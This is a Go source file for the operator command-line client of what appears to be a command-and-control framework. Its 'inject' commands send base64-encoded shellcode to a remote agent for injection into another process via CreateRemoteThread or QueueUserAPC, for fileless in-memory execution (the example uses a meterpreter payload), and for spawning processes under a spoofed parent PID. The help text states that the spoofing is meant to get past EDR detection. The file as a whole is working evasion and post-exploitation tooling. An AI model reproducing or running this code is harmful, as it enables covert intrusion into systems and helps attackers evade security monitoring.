package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

var injectCmd = &cobra.Command{
	Use:   "inject",
	Short: "Shellcode injection (Level 2 evasion)",
	Long:  "Inject shellcode into a remote process or execute it in-memory in the agent.",
}

// inject remote <agent-id> --pid <pid> --file <shellcode.bin> [--method crt|apc]
var injectRemoteCmd = &cobra.Command{
	Use:   "remote <agent-id>",
	Short: "Inject shellcode into a remote process on the agent",
	Long: `Read a local shellcode file and inject it into a running process on the agent.
Shellcode is base64-encoded in transit and never written to disk on the agent.

Methods:
  crt  — CreateRemoteThread (default, noisy but reliable)
  apc  — QueueUserAPC (quieter; executes when a thread enters alertable wait)

Examples:
  inject remote 7d019eb7 --pid 1234 --file /tmp/sc.bin
  inject remote 7d019eb7 --pid 4821 --file /tmp/sc.bin --method apc --wait`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}

		file, _ := cmd.Flags().GetString("file")
		pid, _ := cmd.Flags().GetUint32("pid")
		method, _ := cmd.Flags().GetString("method")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if file == "" {
			printError("--file is required")
			os.Exit(1)
		}
		if pid == 0 {
			printError("--pid is required")
			os.Exit(1)
		}

		sc, err := os.ReadFile(file)
		if err != nil {
			printError(fmt.Sprintf("Cannot read shellcode file: %v", err))
			os.Exit(1)
		}
		if len(sc) == 0 {
			printError("Shellcode file is empty")
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]interface{}{
			"shellcode_b64": base64.StdEncoding.EncodeToString(sc),
			"pid":           pid,
			"method":        method,
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/inject/remote",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Inject failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("Inject failed: %s", msg))
			os.Exit(1)
		}

		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("Injection queued: %d bytes → PID %d via %s", len(sc), pid, method))

		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// inject self <agent-id> --file <shellcode.bin>
var injectSelfCmd = &cobra.Command{
	Use:   "self <agent-id>",
	Short: "Execute shellcode in the agent's own process (fileless, in-memory)",
	Long: `Read a local shellcode file and execute it inside the agent's own process memory.
No payload is written to disk on the agent. Shellcode is base64-encoded in transit.

Use this for fileless execution of second-stage payloads.

Example:
  inject self 7d019eb7 --file /tmp/meterpreter_x64.bin --wait`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}

		file, _ := cmd.Flags().GetString("file")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if file == "" {
			printError("--file is required")
			os.Exit(1)
		}

		sc, err := os.ReadFile(file)
		if err != nil {
			printError(fmt.Sprintf("Cannot read shellcode file: %v", err))
			os.Exit(1)
		}
		if len(sc) == 0 {
			printError("Shellcode file is empty")
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]string{
			"shellcode_b64": base64.StdEncoding.EncodeToString(sc),
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/inject/self",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Self-inject failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("Self-inject failed: %s", msg))
			os.Exit(1)
		}

		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("Fileless execution queued: %d bytes in-memory", len(sc)))

		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// inject ppid <agent-id> <exe> [--ppid <pid> | --ppid-name <name>] [--args "..."]
var injectPPIDCmd = &cobra.Command{
	Use:   "ppid <agent-id> <exe>",
	Short: "Spawn a process with a spoofed parent PID",
	Long: `Create a new process on the agent whose parent process appears as a different process.
EDR tools and process monitors will see the child as belonging to the specified parent,
not the agent — bypassing parent-child chain detection rules.

Examples:
  inject ppid 7d019eb7 "cmd.exe" --ppid-name "explorer.exe"
  inject ppid 7d019eb7 "powershell.exe" --ppid 812 --args "-NoP -W Hidden -C whoami"`,
	Args: cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		exe := args[1]

		ppid, _ := cmd.Flags().GetUint32("ppid")
		ppidName, _ := cmd.Flags().GetString("ppid-name")
		cmdArgs, _ := cmd.Flags().GetString("args")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if ppid == 0 && ppidName == "" {
			printError("--ppid or --ppid-name is required")
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]interface{}{
			"exe":       exe,
			"args":      cmdArgs,
			"ppid":      ppid,
			"ppid_name": ppidName,
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/process/ppid",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("PPID spawn failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("PPID spawn failed: %s", msg))
			os.Exit(1)
		}

		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		parent := ppidName
		if ppid != 0 {
			parent = fmt.Sprintf("PID %d", ppid)
		}
		printSuccess(fmt.Sprintf("Spawning %s as child of %s", exe, parent))

		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}
